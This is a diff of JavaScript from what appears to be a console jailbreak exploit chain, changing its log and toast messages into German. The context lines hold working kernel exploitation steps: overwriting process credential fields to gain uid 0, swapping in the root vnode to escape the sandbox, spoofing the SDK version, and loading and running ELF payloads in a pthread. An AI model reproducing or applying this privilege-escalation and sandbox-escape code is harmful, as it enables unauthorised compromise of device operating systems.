@@ -498,7 +498,7 @@ async function main(userlandRW, wkOnly = false) {
     }
 
     let is_elfldr_running = await probe_sb_elfldr();
-    await log("is elfldr running: " + is_elfldr_running, LogLevel.INFO);
+    await log("ELF-Loader aktiv: " + is_elfldr_running, LogLevel.INFO);
     if (wkOnly && !is_elfldr_running) {
         let res = confirm("ELF-Loader kann nicht aktiviert werden. Weiter?");
         if (!res) {
@@ -568,7 +568,7 @@ async function main(userlandRW, wkOnly = false) {
 
         // Patch creds
         let cur_uid = await chain.syscall(SYS_GETUID);
-        await log("Escalating creds... (current uid=0x" + cur_uid + ")", LogLevel.INFO);
+        await log("Attackiere System mit uid 0x" + cur_uid + "...", LogLevel.INFO);
 
         await krw.write4(krw.procUcredAddr.add32(0x04), 0); // cr_uid
         await krw.write4(krw.procUcredAddr.add32(0x08), 0); // cr_ruid
@@ -593,22 +593,22 @@ async function main(userlandRW, wkOnly = false) {
         await krw.write8(libkernel_ref_addr, new int64(1, 0));
 
         cur_uid = await chain.syscall(SYS_GETUID);
-        await log("Root-Rechte? uid=0x" + cur_uid, LogLevel.INFO);
+        await log("Root-Rechte: uid 0x" + cur_uid + "...", LogLevel.INFO);
 
         // Escape sandbox
         let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
-        await log("Jailbreaking... (in sandbox: " + is_in_sandbox + ")" , LogLevel.INFO);
+        await log("Jailbreak in Sandbox: " + is_in_sandbox + "...", LogLevel.INFO);
         let rootvnode = await krw.read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
         await krw.write8(krw.procFdAddr.add32(0x10), rootvnode); // fd_rdir
         await krw.write8(krw.procFdAddr.add32(0x18), rootvnode); // fd_jdir
 
         is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
-        await log("Sandbox verlassen? " + is_in_sandbox, LogLevel.INFO);
+        await log("Sandbox: " + is_in_sandbox + "...", LogLevel.INFO);
 
         // Patch PS4 SDK version
         if (typeof OFFSET_KERNEL_PS4SDK != 'undefined') {
             await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
-            await log("PS4-Spoof 99.99", LogLevel.INFO);
+            await log("PS4-Spoof-Version: 99.99...", LogLevel.INFO);
         }
 
         ///////////////////////////////////////////////////////////////////////
@@ -832,7 +832,7 @@ async function main(userlandRW, wkOnly = false) {
             p.write8(args.add32(0x28), test_payload_store); // arg6 = int *payloadout
 
             // Execute payload in pthread
-            await log("    Executing...", LogLevel.INFO);
+            await log("    Starte...", LogLevel.INFO);
             await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));
 
         }
@@ -844,7 +844,7 @@ async function main(userlandRW, wkOnly = false) {
             // Join pthread and wait until we're finished executing
             await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
             let res = p.read8(test_payload_store).low << 0;
-            await log("    Finished, out = 0x" + res.toString(16), LogLevel.LOG);
+            await log("    Fertig...", LogLevel.LOG);
 
             return res;
         }
@@ -1219,7 +1219,7 @@ async function main(userlandRW, wkOnly = false) {
                     } else {
                         updateToastMessage(toast, `${payload_info.displayTitle}: Sending to port ${payload_info.toPort}...`);
                         await send_buffer_to_port(elf_store, total_sz, payload_info.toPort);
-                        updateToastMessage(toast, `${payload_info.displayTitle}: Sent to port ${payload_info.toPort}`);
+                        updateToastMessage(toast, ` ${payload_info.displayTitle} wird gestartet...`);
                     }
                 }
 
